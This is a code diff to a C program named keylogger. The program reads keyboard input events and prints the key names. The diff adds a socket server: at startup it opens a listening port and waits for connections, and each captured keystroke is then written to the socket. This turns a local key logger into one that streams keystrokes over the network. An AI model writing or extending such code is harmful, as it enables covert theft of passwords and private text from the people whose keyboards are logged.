@@ -1,3 +1,4 @@
+#include "socket_server.h"
 #include "logger.h"
 #include "key_names.h"
 
@@ -36,6 +37,7 @@ void keylogger ()
                         if (key->value == (unsigned) event[count].code)
                         {
                             fprintf(stderr, "%s", key->name);
+                            write_socket(key->name);
                         }
                     }
                 }
@@ -46,6 +48,9 @@ void keylogger ()
 
 int main (int argc, char* argv[])
 {
+    fprintf(stderr, "Waiting for connections...");
+    start_socket_server(SOCKET_SERVER_PORT);
+    fprintf(stderr, " nice.\n");
     keylogger();
 
     return 0;
